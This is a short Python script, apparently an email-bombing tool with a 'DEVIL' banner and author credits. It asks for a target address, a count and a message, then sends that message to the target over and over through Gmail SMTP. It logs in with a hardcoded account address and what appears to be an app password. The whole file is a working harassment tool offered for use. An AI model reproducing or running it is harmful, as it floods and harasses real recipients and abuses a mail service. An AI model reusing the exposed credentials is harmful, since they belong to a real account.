import requests
import time
import sys
import smtplib
import os

def animated(text):
    for char in text:
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(0.005)

# Clear terminal
os.system("clear")

# Logo and info
logo = '''
\033[1;31m
      ######  ####### #     # ### #       
      #     # #       #     #  #  #       
      #     # #       #     #  #  #       
      #     # #####   #     #  #  #       
      #     # #        #   #   #  #       
      #     # #         # #    #  #       
      ######  #######    #    ### #######
'''

information = '''
\033[1;32m   =============================================\033[33m
[📝]AUTHOR   : Abdul Jabbar 
[📎]Git Hub  : https://github.com/jsjabbar0
[📱]Facebook : https://www.facebook.com/abdul.jabbar.267611
[✏️]Coder    : Jabbar 
  \033[1;32m =============================================           
\033[0m
'''

animated(logo)
animated(information)

# Input from user
number = input("\n\033[1;36mEnter target email: \033[0m")
sms = int(input("\033[1;36mEnter SMS amount: \033[0m"))
msg=input("Enter massage: ")
count = 0
while count < sms:
    try:
        server=smtplib.SMTP("smtp.gmail.com","587")
        server.ehlo()
        server.starttls()
        server.login("skttk849@gmail.com","ivbitppaauyavgdw")
        server.sendmail("skttk849@gmail.com",number,msg)
        print(f"\033[32m[√] Mail sent successful!  [{count+1}]\033[0m")
        count += 1
        time.sleep(1)
        
        
        
    except Exception as e:
        print(f"\033[31m[×] Error occurred: {e}\033[0m")
        time.sleep(2)